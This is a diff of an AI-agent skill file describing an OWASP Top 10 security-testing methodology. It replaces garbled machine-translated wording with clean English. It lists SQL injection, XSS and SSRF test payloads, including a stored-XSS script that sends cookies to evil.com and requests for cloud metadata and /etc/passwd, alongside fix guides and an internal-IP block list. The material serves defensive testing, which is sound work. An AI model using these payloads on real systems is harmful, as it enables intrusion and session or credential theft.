@@ -1,15 +1,15 @@
 ---
 name: owasp-testing-guide
-description: "OWASP Top 10  security test methodology, vulnerabilityper attack , detection , modification guide. 'OWASP', 'Top 10', 'XSS', 'SQL Injection', 'CSRF', 'SSRF', 'Injection', 'security test methodology', 'vulnerability test' etc.  this security test  this  for. code-analystand pentest-reporterof security analysis  -ize. , actual penetration test executionthis network  this of scope ."
+description: "OWASP Top 10-based security testing methodology, per-vulnerability attack vectors, detection methods, and fix guides. Use this skill for web application security testing, including 'OWASP', 'Top 10', 'XSS', 'SQL Injection', 'CSRF', 'SSRF', 'Injection', 'security testing methodology', 'vulnerability testing', and similar requests. It enhances the security analysis capabilities of code-analyst and pentest-reporter. However, actual penetration test execution and network scanning are out of scope for this skill."
 ---
 
-# OWASP Testing Guide — OWASP Top 10 security test guide
+# OWASP Testing Guide — OWASP Top 10 security testing guide
 
-OWASP Top 10 (2021) criteria vulnerabilityper detection/test/modification methodology.
+Per-vulnerability detection/testing/fixing methodology based on OWASP Top 10 (2021).
 
 ## OWASP Top 10 (2021) mapping
 
-|  | category | CWE example | severity |
+| Rank | Category | CWE example | Severity |
 |------|---------|---------|--------|
 | A01 | Broken Access Control | CWE-200, CWE-352 | Critical |
 | A02 | Cryptographic Failures | CWE-259, CWE-327 | High |
@@ -24,29 +24,29 @@ OWASP Top 10 (2021) criteria vulnerabilityper detection/test/modification method
 
 ## A01: Broken Access Control
 
-### test 
+### Test method
 ```
 1. IDOR (Insecure Direct Object Reference)
-   GET /api/users/123/profile → 200 ()
-   GET /api/users/456/profile → 200 () → !
+   GET /api/users/123/profile → 200 (self)
+   GET /api/users/456/profile → 200 (someone else) → vulnerable!
 
-2. permission upper
-   day user tokenas administrator API :
-   POST /api/admin/users (day token) → 403this 
+2. Privilege escalation
+   Call an admin API with a regular user token:
+   POST /api/admin/users (regular token) → should be 403
 
-3. count-based permission this
-   user A tokenas user B resource modification:
-   PUT /api/orders/B_ORDER_ID (A token) → 403this 
+3. Horizontal privilege movement
+   Modify user B's resource with user A's token:
+   PUT /api/orders/B_ORDER_ID (A token) → should be 403
 ```
 
-### modification guide
+### Fix guide
 ```python
-# Before ()
+# Before (vulnerable)
 @app.get("/api/users/{user_id}")
 def get_user(user_id: int):
     return db.query(User).filter(User.id == user_id).first()
 
-# After (modification)
+# After (fixed)
 @app.get("/api/users/{user_id}")
 def get_user(user_id: int, current_user: User = Depends(get_current_user)):
     if user_id != current_user.id and not current_user.is_admin:
@@ -56,18 +56,18 @@ def get_user(user_id: int, current_user: User = Depends(get_current_user)):
 
 ## A03: Injection
 
-### SQL Injection test
+### SQL Injection testing
 
 ```
- thisas:
-├── default: ' OR '1'='1
+Input payloads:
+├── Basic: ' OR '1'='1
 ├── UNION: ' UNION SELECT username,password FROM users --
-├── between : ' AND SLEEP(5) --
-├── error: ' AND 1=CONVERT(int,(SELECT @@version)) --
-└── 2 insert: admin'--  (membersignup  , log  tree)
+├── Time-based blind: ' AND SLEEP(5) --
+├── Error-based: ' AND 1=CONVERT(int,(SELECT @@version)) --
+└── Second-order injection: admin'--  (stored at signup, triggered at login)
 ```
 
-### XSS (Cross-Site Scripting) test
+### XSS (Cross-Site Scripting) testing
 
 ```
 Reflected XSS:
@@ -75,64 +75,64 @@ Reflected XSS:
   /search?q=<img src=x onerror=alert(1)>
 
 Stored XSS:
-  comment/reviewin <script>document.location='evil.com?c='+document.cookie</script>
+  In a comment/review: <script>document.location='evil.com?c='+document.cookie</script>
 
 DOM-based XSS:
-  #<img src=x onerror=alert(1)> (fragment )
+  #<img src=x onerror=alert(1)> (fragment-based)
 ```
 
-### modification principle
+### Fix principles
 
-| vulnerability | modification | framework supported |
+| Vulnerability | Fix | Framework support |
 |--------|------|---------------|
-| SQL Injection | parameter-ize query | ORM for, raw SQL prohibited |
-| XSS |   | React JSX automatic thisthis, DOMPurify |
-| Command Injection | -izethislist verification | subprocess  shell=False |
-| LDAP Injection | parameter  | library within thisthis |
+| SQL Injection | Parameterized queries | Use an ORM, no raw SQL |
+| XSS | Output encoding | React JSX auto-escaping, DOMPurify |
+| Command Injection | Whitelist validation | shell=False with subprocess |
+| LDAP Injection | Parameter binding | Library built-in escaping |
 
 ## A07: Authentication Failures
 
-### test item
+### Test items
 
 ```
-1. root 
-   identical account 10 failure → account lock or count backoff?
+1. Brute-force protection
+   10 failures on the same account → account lockout or exponential backoff?
 
-2. password policy
-   "password" allowed? minimum this? complexalso?
+2. Password policy
+   "password" allowed? Minimum length? Complexity?
 
-3. session 
-   log after thisbefore token valid? (session invalid-ize)
-   token only between -based?
+3. Session management
+   Is the previous token valid after logout? (session invalidation)
+   Is the token expiry time appropriate?
 
 4. JWT verification
-   alg: none attack allowed?
-    key also?
-   token thisasin  information?
+   Is the alg: none attack allowed?
+   Secret key strength?
+   Sensitive information in the token payload?
 
-5. MFA 
-   MFA phase cases possible?
-   backup code root possible?
+5. MFA bypass
+   Can the MFA step be skipped?
+   Can backup codes be brute-forced?
 ```
 
 ## A10: SSRF (Server-Side Request Forgery)
 
-### test thisas
+### Test payloads
 ```
-internal network :
-  url=http://169.254.169.254/latest/meta-data/  (AWS data)
+Internal network access:
+  url=http://169.254.169.254/latest/meta-data/  (AWS metadata)
   url=http://localhost:6379/  (internal Redis)
-  url=http://10.0.0.1/admin  (internal  )
+  url=http://10.0.0.1/admin  (internal admin console)
 
-as type:
+Protocol variants:
   url=file:///etc/passwd
   url=gopher://127.0.0.1:25/
   url=dict://127.0.0.1:6379/info
 ```
 
-### modification
+### Fix
 ```python
-# SSRF : URL -izethislist + internal IP 
+# SSRF prevention: URL whitelist + internal IP blocking
 BLOCKED_RANGES = [
     ipaddress.ip_network("10.0.0.0/8"),
     ipaddress.ip_network("172.16.0.0/12"),
@@ -152,22 +152,22 @@ def is_safe_url(url):
     return True
 ```
 
-## security  list
+## Security header checklist
 
-|  | value | -based |
+| Header | Recommended value | Purpose |
 |------|-------|------|
-| Content-Security-Policy | script-src 'self' | XSS  |
-| X-Content-Type-Options | nosniff | MIME   |
-| X-Frame-Options | DENY |   |
-| Strict-Transport-Security | max-age=31536000; includeSubDomains | HTTPS  |
-| X-XSS-Protection | 0 (CSP for ) |  XSS filter |
-| Referrer-Policy | strict-origin-when-cross-origin |    |
+| Content-Security-Policy | script-src 'self' | XSS prevention |
+| X-Content-Type-Options | nosniff | MIME sniffing prevention |
+| X-Frame-Options | DENY | Clickjacking prevention |
+| Strict-Transport-Security | max-age=31536000; includeSubDomains | Enforce HTTPS |
+| X-XSS-Protection | 0 (when using CSP) | Legacy XSS filter |
+| Referrer-Policy | strict-origin-when-cross-origin | Referrer leak prevention |
 
-## CVSS severity etc.
+## CVSS severity levels
 
-| etc. | count |   |
+| Level | Score | Response deadline |
 |------|------|----------|
-| Critical | 9.0~10.0 | 24between within |
-| High | 7.0~8.9 | 1week within |
-| Medium | 4.0~6.9 | 1itemsmonth within |
-| Low | 0.1~3.9 |   |
+| Critical | 9.0~10.0 | Within 24 hours |
+| High | 7.0~8.9 | Within 1 week |
+| Medium | 4.0~6.9 | Within 1 month |
+| Low | 0.1~3.9 | Next release |
